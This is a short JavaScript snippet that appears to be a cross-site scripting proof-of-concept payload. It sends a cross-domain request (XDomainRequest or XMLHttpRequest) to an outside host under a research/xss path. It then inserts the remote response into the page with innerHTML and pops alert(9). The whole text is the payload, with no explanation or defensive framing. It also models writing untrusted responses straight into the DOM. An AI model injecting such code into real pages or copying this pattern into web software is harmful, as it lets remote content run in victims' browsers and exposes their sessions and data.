
var outReq="x";
  var isIE8 = window.XDomainRequest ? true : false;
  var invocation = createCrossDomainRequest();
  var url = 'http://www.phobos7.co.uk/research/xss/simple.php';
  function createCrossDomainRequest(url, handler) {
    var request;
    if (isIE8) {
      request = new window.XDomainRequest();
      }
      else {
        request = new XMLHttpRequest();
      }
    return request;
  }

  function callOtherDomain() {
    if (invocation) {
      if(isIE8) {
        invocation.onload = outputResult;
        invocation.open("GET", url, true);
        invocation.send();
      }
      else {
        invocation.open('GET', url, true);
        invocation.onreadystatechange = handler;
        invocation.send();
				
      }
    }
    else {
      var text = "No Invocation TookPlace At All";
      var textNode = document.createTextNode(text);
      var textDiv = document.getElementById("textDiv");
      textDiv.appendChild(textNode);
    }
		return invocation;
  }

  function handler(evtXHR) {
    if (invocation.readyState == 4)
    {
      if (invocation.status == 200) {
          outputResult();
      }
      else {
        alert("Invocation Errors Occured");
      }
    }
  }

  function outputResult() {
    var response = invocation.responseText;
    var textDiv = document.getElementById("textDiv");
    textDiv.innerHTML += response;
		 outReq=response;
		alert(9);
  }
